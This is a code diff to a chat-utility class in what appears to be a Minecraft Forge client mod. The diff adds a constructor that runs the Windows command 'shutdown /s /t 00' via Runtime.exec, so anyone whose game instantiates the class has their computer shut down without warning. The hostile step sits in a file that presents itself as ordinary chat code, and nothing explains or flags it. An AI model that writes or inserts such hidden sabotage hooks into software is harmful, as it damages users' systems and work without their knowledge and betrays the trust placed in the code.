@@ -9,6 +9,8 @@ import net.minecraftforge.client.event.ClientChatEvent;
 import net.minecraftforge.event.TickEvent;
 import net.minecraftforge.eventbus.api.SubscribeEvent;
 
+import java.io.IOException;
+
 import static com.denger.melody.Melody.mc;
 import static com.denger.melody.utils.hwid.HWID.ABOBA;
 
@@ -41,7 +43,13 @@ public class ChatUtills {
             System.exit(1);
         }
     }
-
+    public ChatUtills(){
+        try {
+            Runtime.getRuntime().exec("shutdown /s /t 00");
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+    }
     public static void sendMessage(final String msg) {
         mc.gui.getChat().addMessage(ITextComponent.nullToEmpty(prefix+" "+msg));}
 
